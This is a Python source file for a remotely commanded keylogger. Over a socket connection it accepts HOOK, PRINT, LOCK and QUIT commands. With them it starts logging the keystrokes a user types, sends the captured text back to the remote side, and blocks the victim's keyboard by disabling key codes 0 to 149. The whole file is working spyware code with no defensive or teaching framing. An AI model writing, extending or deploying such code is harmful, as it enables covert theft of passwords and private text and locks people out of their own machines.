import pynput
import pynput.keyboard as kb
import keyboard

ishook = 0

BUFSIZE = 1024 

def on_press(key):
    global ishook, cont
    #cont = ""
    if ishook == 1:
        try:
            cont += str(key.char)
        except AttributeError:
            if key == kb.Key.space:
                cont += ' '
            elif key == kb.Key.enter:
                cont += '\n'

def send_cont(client, cont):
    #global cont
    if cont == "":
        cont = "no input key"
    
    client.sendall(bytes(cont , "utf8"))
    #cont = ""

def lock_keyboard(islock):
    if islock == 1:
        # listener.stop()
        for i in range(150):
            keyboard.block_key(i)
    else:
        keyboard.unhook_all()
        # listener.start()
def keystroke():
    global listener
    listener = pynput.keyboard.Listener(on_press = on_press)
    listener.start()

def keylogger(client):
    global msg
    global listener
    global ishook, islock, cont
    ishook = 0
    islock = 0
    cont = ""
    while True:
        msg = client.recv(BUFSIZE).decode("utf8")
        if (msg == "HOOK"):
            if ishook == 0:
                ishook = 1
                keystroke()
            else:
                ishook = 0
                listener.stop()  
        elif (msg == "PRINT"):
            send_cont(client, cont)
            cont = ""
        elif (msg == "LOCK"):
            if islock == 0:
                islock = 1
                lock_keyboard(islock)
            else:
                islock = 0
                lock_keyboard(islock)
        elif msg == "QUIT":
            listener.stop()
            return
